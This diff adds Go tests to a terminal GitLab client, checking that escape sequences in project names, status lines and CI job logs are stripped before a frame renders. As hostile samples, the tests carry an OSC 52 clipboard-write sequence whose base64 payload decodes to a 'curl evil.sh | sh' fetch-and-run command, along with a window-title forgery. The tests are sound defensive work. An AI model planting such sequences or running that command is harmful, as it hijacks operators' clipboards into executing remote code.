@@ -560,3 +560,94 @@ func TestProjectSearch_SuppressesGlabYank(t *testing.T) {
 		t.Fatalf("status = %q, want %q", m.status, wantStatus)
 	}
 }
+
+// TestApp_HostileGitLabContentCannotDriveTheTerminal: content chosen by a remote party
+// renders as text, never as terminal instructions.
+// Given a project named with a clipboard-write sequence and a status line carrying a
+// window-title forgery, when the app renders a frame, then the frame carries the visible
+// text and no escape sequence other than colour.
+// Why it matters: any person who can open a merge request chooses these bytes, and OSC 52
+// would let them overwrite the clipboard the operator pastes glab commands from.
+func TestApp_HostileGitLabContentCannotDriveTheTerminal(t *testing.T) {
+	// Given: a running app whose project path carries a clipboard write and whose status
+	// line carries a window-title forgery
+	m := demoAppModel(t, projectTabAll)
+	m.allProjects[0].PathWithNamespace = "\x1b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\aacme/api"
+	m.invalidateVisibleCache()
+	m.updateProjectList()
+	m.status = "\x1b]0;HIJACKED\aloaded 30 projects"
+
+	// When: the app renders a frame
+	frame := m.View()
+
+	// Then: no sequence that acts on the terminal survives
+	for _, banned := range []string{"\x1b]52", "\x1b]0;", "\a"} {
+		if strings.Contains(frame, banned) {
+			t.Errorf("frame carries %q, which the terminal would execute", banned)
+		}
+	}
+
+	// And: the readable text of both survives, so the filter strips rather than blanks
+	for _, want := range []string{"acme/api", "loaded 30 projects"} {
+		if !strings.Contains(frame, want) {
+			t.Errorf("frame dropped %q along with the escape sequence", want)
+		}
+	}
+}
+
+// TestApp_FilterLeavesABenignFrameUnchanged: filtering costs nothing on ordinary content.
+// Given the app rendering demo data that carries no hostile sequence, when the filtered
+// and unfiltered frames are compared, then they are byte-identical.
+// Why it matters: the filter runs on every keystroke, so if it altered lipgloss colour,
+// borders, or padding it would corrupt the whole interface rather than protect it.
+func TestApp_FilterLeavesABenignFrameUnchanged(t *testing.T) {
+	// Given: the app rendering ordinary demo content across every panel
+	m := demoAppModel(t, projectTabAll)
+
+	// When: the filtered and unfiltered frames are produced
+	filtered := m.View()
+	unfiltered := m.render()
+
+	// Then: the filter changed nothing
+	if filtered != unfiltered {
+		t.Errorf("filter altered a benign frame\n before %q\n after  %q", unfiltered, filtered)
+	}
+	// And: the frame is a real one, not an empty string that would pass trivially
+	if !strings.Contains(unfiltered, "acme-corp") {
+		t.Fatal("frame did not render demo content, so the comparison proves nothing")
+	}
+}
+
+// TestApp_HostileJobLogCannotDriveTheTerminal: a CI job's own output cannot act on the
+// terminal that displays it.
+// Given a pipeline job whose trace printed a clipboard-write sequence, when the stages
+// panel renders the log, then the sequence is absent from the frame while the surrounding
+// log text still reads normally.
+// Why it matters: a job trace is the widest opening in the app, because anyone who can open
+// a merge request can make a runner print any bytes they choose into it.
+func TestApp_HostileJobLogCannotDriveTheTerminal(t *testing.T) {
+	// Given: a stages panel showing a job trace that carries a clipboard write
+	m := demoPipelinesPanelModel(t)
+	m.focus.Active = PanelStages
+	log := "Running with gitlab-runner 16.0\n" +
+		"\x1b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\a$ go build ./...\n" +
+		"Job succeeded\n"
+	m.pipelineView.logPreview.content = log
+	m.setLogViewportContent(log)
+
+	// When: the app renders a frame
+	frame := m.View()
+
+	// Then: the log is genuinely on screen, so the assertions below are not vacuous
+	if !strings.Contains(frame, "gitlab-runner") {
+		t.Fatal("log pane did not render, so this test proves nothing")
+	}
+	// And: the clipboard write did not survive into the frame
+	if strings.Contains(frame, "\x1b]52") || strings.Contains(frame, "\a") {
+		t.Error("frame carries the clipboard write from the job trace")
+	}
+	// And: the readable trace survives
+	if !strings.Contains(frame, "go build ./...") {
+		t.Error("frame dropped the log text along with the escape sequence")
+	}
+}
